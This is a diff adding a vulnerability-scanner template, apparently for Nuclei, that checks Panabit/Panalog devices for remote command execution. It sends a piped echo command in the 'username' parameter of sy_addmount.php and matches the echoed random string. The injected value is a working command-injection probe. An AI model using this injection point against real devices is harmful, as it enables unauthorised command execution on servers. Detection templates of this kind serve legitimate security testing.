@@ -1,0 +1,31 @@
+id: panabit-syaddmount-command-exec
+
+info:
+  name: panalog-无-命令执行
+  author: xiaohe
+  severity: high
+  description: panalog或panabit下的设备存在远程命令执行漏洞，攻击者可利用该漏洞获取服务器权限
+  reference:
+    - https://blog.csdn.net/weixin_51387754/article/details/121147617
+    - https://stack.chaitin.com/security-challenge/poc/detail?id=847
+  tags: panabit,dzzoffice,rce
+
+variables:
+  a1: ""
+  a2: "{{base64('hello')}}"
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/account/sy_addmount.php?username=|echo%20{{randstr}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '{{randstr}}'
+        
+      - type: status
+        status:
+          - 200
